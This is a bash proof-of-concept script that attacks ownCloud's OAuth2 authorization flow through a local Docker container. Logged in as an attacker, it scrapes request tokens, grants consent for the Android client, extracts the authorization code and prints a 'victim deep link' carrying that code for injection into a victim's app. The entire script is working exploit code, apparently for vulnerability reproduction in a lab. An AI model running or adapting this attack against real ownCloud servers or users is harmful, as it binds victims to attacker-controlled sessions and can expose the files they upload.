#!/usr/bin/env bash
set -euo pipefail

OC_BASE="${OC_BASE:-http://localhost:8080}"
ATTACKER_USER="${ATTACKER_USER:-attacker}"
ATTACKER_PASS="${ATTACKER_PASS:-S3cureAttacker!2026}"
CLIENT_ID="${CLIENT_ID:-e4rAsNUSIUs0lF4nbv9FmCeUkTlV9GdgTLDH1b5uie7syb90SzEVrbN7HIpmWJeD}"
REDIRECT_URI="${REDIRECT_URI:-oc://android.owncloud.com}"
STATE="${STATE:-attackerstate}"

log(){ printf '[attacker-code] %s\n' "$*"; }
fail(){ printf '[attacker-code][error] %s\n' "$*" >&2; exit 1; }
command -v docker >/dev/null 2>&1 || fail "docker required"

out=$(docker exec -i \
  -e OC_BASE="$OC_BASE" \
  -e ATTACKER_USER="$ATTACKER_USER" \
  -e ATTACKER_PASS="$ATTACKER_PASS" \
  -e CLIENT_ID="$CLIENT_ID" \
  -e REDIRECT_URI="$REDIRECT_URI" \
  -e STATE="$STATE" \
  owncloud_server sh -s <<'EOS'
set -eu
JAR=$(mktemp)
cleanup(){ rm -f "$JAR"; }
trap cleanup EXIT

reqtoken=$(curl --max-time 15 -skL -c "$JAR" "$OC_BASE/index.php/login" \
  | sed -n 's/.*name="requesttoken" value="\([^"]*\)".*/\1/p' | head -1)
[ -n "$reqtoken" ] || { echo "ERR:no_requesttoken"; exit 1; }

curl --max-time 15 -sk -b "$JAR" -c "$JAR" \
  -d "user=$ATTACKER_USER" \
  -d "password=$ATTACKER_PASS" \
  -d "requesttoken=$reqtoken" \
  "$OC_BASE/index.php/login" >/dev/null

# Build authorize URL once
auth_url="$OC_BASE/index.php/apps/oauth2/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&state=$STATE"

# Fetch authorize page to get consent requesttoken
auth_reqtoken=$(curl --max-time 15 -sk -b "$JAR" "$auth_url" \
  | sed -n 's/.*name="requesttoken" value="\([^"]*\)".*/\1/p' | head -1)
[ -n "$auth_reqtoken" ] || { echo "ERR:no_auth_requesttoken"; exit 1; }

# Submit consent to obtain redirect with code
loc=$(curl --max-time 15 -sk -D - -o /dev/null -b "$JAR" \
  -d "requesttoken=$auth_reqtoken" \
  "$auth_url" \
  | awk '/^Location: /{print $2}' | tr -d '\r')
[ -n "$loc" ] || { echo "ERR:no_location"; exit 1; }

code=$(printf '%s\n' "$loc" | sed -n 's/.*code=\([^&]*\).*/\1/p')
[ -n "$code" ] || { echo "ERR:no_code"; exit 1; }

printf 'CODE=%s\nLINK=%s?code=%s&state=anything\n' "$code" "$REDIRECT_URI" "$code"
EOS
) || fail "docker exec failed"

case "$out" in
  ERR:*) fail "$out" ;;
esac

code=$(printf '%s\n' "$out" | sed -n 's/^CODE=//p')
link=$(printf '%s\n' "$out" | sed -n 's/^LINK=//p')
[ -n "$code" ] || fail "authorization code not found (docker exec output empty)"

log "Authorization code: $code"
log "Victim deep link: $link"

